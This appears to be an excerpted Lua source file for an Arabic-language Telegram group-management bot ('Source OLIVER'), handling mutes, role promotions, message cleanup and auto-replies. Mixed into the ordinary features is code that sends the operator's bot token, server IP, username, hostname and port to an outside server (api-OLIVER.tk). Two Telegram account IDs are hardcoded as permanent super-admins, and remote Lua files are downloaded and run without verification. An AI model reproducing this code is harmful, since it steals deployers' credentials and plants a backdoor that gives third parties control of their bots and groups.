...
data,res = https.request("https://api-OLIVER.tk/api-eeeeeeB/OLIVER.php?bn=OLIVER&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-OLIVER.tk/api-eeeeeeB/OLIVER.php?n=OLIVER&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-OLIVER/Files_OLIVER/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1873723582,1938060701}   
...
local hash = database:sismember(bot_id.."eeeeeeB:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
var = true  
elseif tonumber(user_id) == tonumber(1938060701) then
var = true  
...
var = true  
elseif database:sismember(bot_id..'eeeeeeB:MN:TF'..chat_id, user_id) then
var = true 
...
os.execute('wget https://raw.githubusercontent.com/SRC-OLIVER/OLIVER/main/OLIVER.lua')
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس اوليفير\n ℘︙ الاصدار » { v 1.6 }')
dofile('OLIVER.lua')  
end
if text == 'الاصدار ℘' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس اوليفير \n ℘︙ الاصدار »{ v 1.6 }')
end
...
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'BxxDx')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
if OLIVER1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BxxDx')..') \n ℘︙ '..OLIVER1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/BxxDx)}\n ℘︙ ["..OLIVER_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](T.ME/BxxDx)}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."OLIVER:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."OLIVER:blocname"..msg.chat_id_)
...
function eeeeeeB_name(t1,t2)
if t2.id_ then 
name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."OLIVER:blocname"..msg.chat_id_) or ""
...
bnnaGet(msg.sender_user_id_, eeeeeeB_name)
end
...
database:set(bot_id.."OLIVER:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."OLIVER:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."OLIVER:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."OLIVER:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."OLIVER:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."OLIVER:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."OLIVER:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."OLIVER:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."OLIVER:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."OLIVER:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "BxxDx")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."OLIVER:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local OLIVERChengName = database:get(bot_id.."OLIVER:Cheng:Name"..data.id_)
if not data.first_name_ then 
if OLIVERChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..OLIVERChengName..']')
database:del(bot_id.."OLIVER:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if OLIVERChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."OLIVER:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local OLIVERChengUserName = database:get(bot_id.."OLIVER:Cheng:UserName"..data.id_)
if not data.username_ then 
if OLIVERChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..OLIVERChengUserName..']')
database:del(bot_id.."OLIVER:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if OLIVERChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."OLIVER:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local OLIVERChengPhoto = database:get(bot_id.."OLIVER:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if OLIVERChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."OLIVER:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if OLIVERChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."OLIVER:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
℘ ⦑ SOURCE OLIVER ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/BxxDx)
℘︙ [Source Update ](t.me/FIDRG)     
℘︙ [Source developer](t.me/eeeeeeB)     
℘︙ [OLIVER programmer](t.me/mndzr) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS OLIVER](t.me/BxxDxbot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BxxDx')..') \n ℘︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BxxDx')..') \n ℘︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."eeeeeeB:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'eeeeeeB:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-OLIVER/Files_OLIVER/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات اوليفير\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس اوليفير ↓\n".." ℘︙ [اضغط هنا لدخول](t.me/BxxDx) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-OLIVER/Files_OLIVER/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('OLIVER.lua')  
else
send(msg.chat_id_, msg.id_," ℘︙ عذرا الملف لايدعم سورس اوليفير \n") 
end
return false
end
...
local UserName = (b.username_ or "SRC-OLIVER")
...
database:del(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ℘︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_)
t = "\n ℘︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
status  = '\n ℘︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'BxxDx')..')'
status  = '\n ℘︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
status  = '\n ℘︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'BxxDx')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
status  = '\n ℘︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ℘︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
...
if not database:get(bot_id..'eeeeeeB:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'eeeeeeB:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."eeeeeeB:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."eeeeeeB:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "℘︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."eeeeeeB:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."eeeeeeB:allM"..msg.chat_id_)
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'اوليفير').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'اوليفير')
local OLIVER_Msg = {
'عمغي 🥺💕.',
...
if database:sismember(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'eeeeeeB:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ℘︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:OLIVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:OLIVER:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:OLIVER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:OLIVER:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:OLIVER:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:OLIVER:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:OLIVER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:OLIVER:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:OLIVER:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:OLIVER:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/BxxDx"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."BxxDx:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."BxxDx:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."BxxDx:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."BxxDx:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."BxxDx:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."BxxDx:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس اوليفير يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:OLIVER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:OLIVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:OLIVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:OLIVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:OLIVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:OLIVER:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'اوليفير').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'BxxDx')..')'
local iduser = result.sender_user_id_
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/BxxDx"},
},
}
local msg_id = msg.id_/2097152/0.5
...
{
{text = '𝐃𝐑𝐀??𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/BxxDx"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'اوليفير')
